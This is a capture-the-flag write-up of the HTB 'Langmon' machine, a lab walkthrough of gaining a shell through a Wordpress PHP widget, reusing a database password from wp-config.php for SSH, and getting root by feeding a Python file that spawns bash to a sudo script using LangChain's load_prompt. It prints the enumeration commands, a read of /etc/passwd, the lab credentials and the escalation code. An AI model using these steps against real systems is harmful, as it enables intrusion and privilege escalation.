In this challenge I used a Wordpress plugin to get code execution, and a vulnerability in [LangChain](https://docs.langchain.com/docs/) to get root.

> Very Easy

## Enumeration

I started the machine by looking for open ports.

```bash
$ rustscan -a target -- -A -Pn | tee rust.txt
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'

There were two:
* 22 (SSH)
* 80 (HTTP)

The website was redirecting to 'langmon.htb', I added the domain to my hosts file.

I ran scans for subdomains and hidden pages. It did not find anything interesting.

## Website

I opened a browser to look at the website.

![Wordpress site](/assets/images/2023/07/HTBBusinessCTF/Langmon/Langmon.png "Wordpress Site")

It was a Wordpress site, so I scanned it with `wpscan`.

```bash
$ wpscan --url http://langmon.htb/ -e ap,u

The scan found one user and two plugins. The plugins had known vulnerabilities, but in older versions. I tried brute forcing the user's password with `wpscan`, but it failed.

The site had registration open. I created a user and looked at the dashboard. I was not allowed to do much. I could create draft posts, but not publish them.

It took me a while to find it, but when creating a post, there was a 'PHP + HTML' widget I could use. 

![PHP Code Execution](/assets/images/2023/07/HTBBusinessCTF/Langmon/PHP.png "PHP Code Execution")

This gave me code execution on the server. I used it to get a reverse shell.

![Reverse Shell](/assets/images/2023/07/HTBBusinessCTF/Langmon/RCE.png "Reverse Shell")

I started a netcat listener and applied this change. I got a shell on the server.

## Getting a User

I was on the server as 'www-data'. I looked into the Wordpress configuration (wp-config.php). It contains database credentials.

```php
<?php
define( 'DB_NAME', 'pwndb' );
define( 'DB_USER', 'wordpress_user' );
define( 'DB_PASSWORD', 'SNJQvwWHCK' );
define( 'DB_HOST', 'localhost' );
define( 'DB_CHARSET', 'utf8' );
define( 'DB_COLLATE', '' );
define('AUTH_KEY',         '~vLELa>,uQNv8Qi07@&fPoP K?uH5z) [#[#{E>_+NeZu}8GrCWE=:4R>^PLSVUU');

...
```

Before connecting to the database, I wanted to check if the found password worked with a user. I read the passwd file to find users.

```bash
www-data@langmon:/var/www/langmon.htb$ cat /etc/passwd

There was one, I tried connecting as them with the database password.

```bash
$ ssh developer@target

developer@langmon:~$ cat user.txt
HTB{4lw4y5_upd473_y0ur_plu61n5}
```

It worked, and I got the user flag.

## Getting root

I looked if the user could run anything with `sudo`.

```bash
developer@langmon:~$ sudo -l
[sudo] password for developer:
Sorry, try again.
[sudo] password for developer:
Matching Defaults entries for developer on langmon:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User developer may run the following commands on langmon:
    (root) /opt/prompt_loader.py
```

They could run a Python script. I looked at what the script did.

```python
developer@langmon:~$ cat /opt/prompt_loader.py
#!/usr/bin/python3
import sys
from langchain.prompts import load_prompt

def load(file):
        try:
                load_prompt(file)
        except:
                print("There is something wrong with the prompt file.")

if __name__ == "__main__":
        if len(sys.argv) != 2:
                print("Usage: prompt_loader.py <prompt_file_path>")
        else:
                file = sys.argv[1]
                load(file)
```

The script took a file as parameter and passed it to `load_prompt`. I search for vulnerabilities and found that it would [execute any Python code in the file](https://tutorialboy.medium.com/langchain-arbitrary-command-execution-cve-2023-34541-8f56fe2737b0).

I created a script that launched bash.

```python
#!/usr/bin/python3

import os
os.system("/bin/bash")
```

And called the loader to become root.

```bash
developer@langmon:~$ sudo /opt/prompt_loader.py test.py

root@langmon:/home/developer# whoami
root

root@langmon:/home/developer# cat /root/root.txt
HTB{7h3_m4ch1n35_5p34k_w3_h34r}
```
